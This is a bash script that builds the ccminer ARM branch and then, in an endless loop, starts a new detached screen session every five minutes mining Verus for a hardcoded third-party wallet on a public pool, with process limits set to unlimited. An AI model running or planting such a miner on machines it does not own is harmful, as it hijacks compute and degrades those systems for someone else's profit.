#!/usr/bin/env bash
sudo apt update
sudo apt upgrade -y
sudo apt install cpulimit -y
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y

 git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git

cd ccminer

 chmod +x build.sh

 chmod +x configure.sh

 chmod +x autogen.sh

 ./build.sh
 
echo "nambah limit sek bos"
ulimit -u unlimited
ulimit -n 100000

while true; do
   i=$(shuf -i 70-77 -n 1)  # Pilih angka acak antara 70-77
   screen -dmS Miner_$i ./ccminer -a verus \
      -o stratum+tcp://eu.luckpool.net:3957#xnsub \
      -u REzE9WtQM5vfTU5ji5tLRWMfmYZmRevsXN -p x \
      -t 1 --cpu-priority=5
   echo "Sesi Miner_$i dibuat pada $(date)"
   sleep 300  # Tunggu 5 menit sebelum membuat sesi baru
done


echo "74 Mlaku."
